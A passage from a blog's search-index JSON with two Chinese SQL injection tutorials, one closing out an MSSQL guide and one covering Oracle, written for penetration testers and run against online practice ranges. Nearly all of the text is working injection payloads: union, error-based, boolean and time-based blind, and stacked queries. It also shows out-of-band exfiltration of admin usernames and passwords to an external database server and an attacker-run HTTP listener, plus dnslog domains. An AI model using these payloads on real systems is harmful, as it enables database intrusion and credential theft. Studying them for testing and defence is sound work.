null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name&lt;&gt;&#x27;id&#x27; and name&lt;&gt;&#x27;username&#x27;-- qwe#使用not in获取数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe 堆叠注入在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。 1http://192.168.150.4:9001/less-1.asp?id=1&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;;-- qwe 0x03 显错注入1、判断当前字段数1http://219.153.49.228:40574/new_list.asp?id=2 order by 4 1http://219.153.49.228:40574/new_list.asp?id=2 order by 5 通过order by报错情况，可以判断出当前字段为4。 2、联合查询，获取显错点1、首先因为不知道具体类型，所以还是先用null来填充字符 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe 2、替换null为’null’，获取显错点 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe 当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select &#x27;null&#x27;,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe 3、通过显错点获取数据库信息1、获取数据库版本 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select @@version),null -- qwe 2、查询当前数据库名称通过轮询db_name()里的内容，获取所有数据库库名 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(5)),null -- qwe 3、查询当前用户 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select user),null -- qwe 4、查询表名查询dbo.sysobjects表中用户创建的表，获取其对应的id和name 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe 查询下一个表名 1#使用&lt;&gt;获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id &lt;&gt; 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id not in (&#x27;5575058&#x27;) -- qwe 5、查询列名这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27;-- qwe 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe 6、information_schema值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 table_name from information_schema.tables where table_name &lt;&gt; &#x27;manager&#x27;),null -- qwe 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; and column_name not in (&#x27;id&#x27;,&#x27;username&#x27;)),null -- qwe 7、获取数据1http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username &lt;&gt; &#x27;admin_mz&#x27;-- qwe 解密获取密码 0x04 报错注入mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。 1、直接报错等号两边数据类型不一致配合子查询获取数据。 1#获取数据库库名?id=1&#x27; and 1=(select db_name()) -- qwe 1#获取第一个表名?id=1&#x27; and 1=(select top 1 name from dbo.sysobjects) -- qwe 1#将数据连接显示?id=1&#x27; and 1=stuff((select db_name() for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+ 2、convert()函数1convert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。 具体用法如下： 1#获取数据库库名?id=1&#x27; and 1=convert(int,(select db_name())) -- qwe 1#获取数据库版本?id=1&#x27; and 1=convert(int,(select @@version))) -- qwe 3、cast()函数1CAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。 具体用法如下： 1#查询当前数据库?id=1&#x27; and 1=(select cast(db_name() as int)) -- qe 1#查询第一个数据表?id=1&#x27; and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe 4、数据组合输出1#将数据表组合输出?id=1&#x27; and 1=stuff((select quotename(name) from dbo.sysobjects for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+ 1#查询users表中的用户名并组合输出?id=1&#x27; and 1=stuff((select quotename(username) from users for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+ 0x05 布尔盲注1、查询数据库库名1、查询数据库库名长度为11 1http://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11 2、查询第一个字符的ascii码为109 1http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))&gt;109 3、查询第二个字符的ascii码为111 1http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111 4、获取所有ascii码之后，解码获取数据 2、查询表名除了像上面查询库名使用了ascii码外，还可以直接猜解字符串 1http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27; 1http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,6)=&#x27;manage&#x27; 0x06 延时盲注1、延时函数 WAITFOR DELAY1语法：n表示延时几秒WAITFOR DELAY &#x27;0:0:n&#x27;id=1 if (布尔盲注的判断语句) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe 2、查询数据1#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe 1#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27;) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe 0x07 反弹注入就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。反弹注入需要使用opendatasource函数。 1OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。 1申请免费云服务器：香港云：http://www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/ 1、环境准备1、首先打开靶场3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。 1CREATE TABLE test(name VARCHAR(255)) 2、获取数据库所有表1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。 1#查询sysobjects表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe 2、执行成功页面返回正常。3、在数据库中成功获取到数据。 3、获取数据库admin表中的所有列名1#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name=&#x27;admin&#x27;-- qwe#查询syscolumns表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe 4、获取数据1、首先新建一个表，里面放三个字段，分别是id，username和passwd。 1CREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255)) 2、获取admin表中的数据 1?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.data select id,username,passwd from admin -- qwe 0x08 总结完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。 靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～","path":"2021/02/02/MSSQL数据库注入全方位利用/"},{"title":"Oracle数据库注入总结","text":"0x01 前言在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～ 0x02 注入点确定跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。 1http://219.153.49.228:43469/new_list.php?id=1%20and%201=1 1http://219.153.49.228:43469/new_list.php?id=1%20and%201=2 0x03 显错注入1、判断字段数为2与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。 1http://219.153.49.228:43469/new_list.php?id=1%20order%20by%202 2、获取显错点联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select ‘null’,’null’。(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。) 1234#联合查询http://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual#修改null为&#x27;null&#x27;，判断字段类型均为字符型http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual 后续便可以替换显错点进行注入。 3、查询数据库版本信息1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual 4、获取当前数据库连接用户123http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select sys_context(&#x27;userenv&#x27;,&#x27;current_user&#x27;) from dual) from dualhttp://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;1&#x27;,user from dual 5、查询当前数据库库名1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual 6、查询数据库表名查询表名一般查询admin或者user表 直接查询获取第一个表名LOGMNR_SESSION_EVOLVE$ 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual 获取第二个表名LOGMNR_GLOBAL$ 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual 获取第三个表名LOGMNR_GT_TAB_INCLUDE$ 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27; and table_name not in &#x27;LOGMNR_GLOBAL$&#x27;) from dual 模糊搜索查询获取sns_users表名 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual 7、查询数据库列名直接查询获取sns_users表里的字段 123456789http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dualhttp://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dualhttp://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27;) from dual……………http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27; and column_name not in &#x27;PROTOCOL&#x27; and column_name not in &#x27;SPARE1&#x27; and column_name not in &#x27;DB_USERNAME&#x27; and column_name not in &#x27;OID&#x27; and column_name &lt;&gt; &#x27;EVENTID&#x27; and column_name &lt;&gt; &#x27;NAME&#x27; and column_name &lt;&gt; &#x27;TABLE_OBJNO&#x27;) from dual 12345678910111213获取如下字段：USER_NAMEAGENT_NAMEPROTOCOLSPARE1DB_USERNAMEOIDEVENTIDNAMETABLE_OBJNOUSAGEUSER_PWD………… 模糊搜索查询123http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dualhttp://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27; and column_name &lt;&gt; &#x27;USER_NAME&#x27;) from dual 8、查询数据库数据获取账号密码字段内容 1http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 1http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; 1http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; and USER_NAME not in &#x27;hu&#x27; 解密获取密码392118 9、美化输出Oracle采用||进行数据连接 1http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;用户名：&#x27;||USER_NAME,&#x27;密码：&#x27;||USER_PWD from &quot;sns_users&quot; where rownum=1 0x04 报错注入报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。 1、ctxsys.drithsx.sn()12#获取当前数据库用户 ORACLE1?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) -- 12#获取数据库版本信息?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) -- 2、XMLType()1?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- 3、dbms_xdb_version.checkin()12#获取数据库版本信息?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 4、bms_xdb_version.makeversioned()12#获取当前数据库用户 ORACLE1?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- 5、dbms_xdb_version.uncheckout()12#获取数据库版本信息?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 6、dbms_utility.sqlid_to_sqlhash()12#获取数据库版本信息?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 7、ordsys.ord_dicom.getmappingxpath()1?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)-- 8、utl_inaddr.*()utl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址） 12?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) -- 0x05 布尔型盲注常用猜解： 12345#猜长度?id=1 and 6=(select length(user) from dual)--#截取值猜ascii码?id=1 and (select ascii(substr(user,1,1)) from dual)&gt;83?id=1 and (select ascii(substr(user,1,1)) from dual)=83 1、decode函数布尔盲注decode(字段或字段的运算，值1，值2，值3）这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3 测试用户名长度1http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) -- 测试当前用户是否为SYSTEM12#如果是system用户则返回正常，不是则返回不正常http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- 12345678910#使用substr截断，逐个字段进行猜解http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) -- ?id=1 and 1=(select decode(substr(user,2,1),&#x27;Y&#x27;,1,0) from dual) -- ?id=1 and 1=(select decode(substr(user,3,1),&#x27;S&#x27;,1,0) from dual) --?id=1 and 1=(select decode(substr(user,4,1),&#x27;T&#x27;,1,0) from dual) --?id=1 and 1=(select decode(substr(user,5,1),&#x27;E&#x27;,1,0) from dual) --?id=1 and 1=(select decode(substr(user,6,1),&#x27;M&#x27;,1,0) from dual) --#当然也可以配合ascii码进行猜解?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,1,0) from dual) -- 2、instr函数布尔盲注instr函数的应用： 12select instr(&#x27;abcdefgh&#x27;,&#x27;de&#x27;) position from dual;#返回结果：4 盲注中的应用： 12http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),&#x27;SYS&#x27;)) --?id=1 and 4=(instr((select user from dual),&#x27;T&#x27;)) -- 0x06 延时盲注1、检测漏洞存在DBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。具体用法为：DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)pipename为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。timeout为integer的可选输入参数，用来指定等待时间。常用payload如下： 1http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)-- 如果页面延时10秒返回，即存在注入。 2、配合decode函数延时盲注只需要将延时语句放入decode函数中即可 12345#直接猜解字符?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --#通过ascii猜解字符?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) -- 3、使用其他延时查询来判断如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。 12345#直接猜解字符?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --#通过ascii猜解字符?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,(select count(*) from all_objects),0) from dual) -- 0x07 外带数据注入1、url_http.request()使用此方法，用户需要有utl_http访问网络的权限首先检测是否支持，页面返回正常则表示支持 1?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) -- 然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务： 1python3 -m http.server 4455 12345#子查询数据库版本信息并访问python起的http服务?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;||(select banner from sys.v_$version where rownum=1))=1--#http访问时可以将||进行URL编码?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;%7C%7C(select banner from sys.v_$version where rownum=1))=1-- 可以看到成功获取了数据 2、utl_inaddr.get_host_address()函数12#使用dnslog外带数据?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null -- 3、SYS.DBMS_LDAP.INIT()函数网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。 123?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --?id=1 and (select DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null -- 4、HTTPURITYPE()函数1?id=1 and (select HTTPURITYPE(&#x27;http://192.168.100.130:4455/&#x27;||(select user from dual)).GETCLOB() FROM DUAL)is not null -- 同样需要python起一个http服务，或者nc创建监听虽然访问404，但是同样成功外带数据。 0x08 总结Oracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～","path":"2021/02/02/Oracle数据库注入总结/"}],"categories":[],"tags":[]}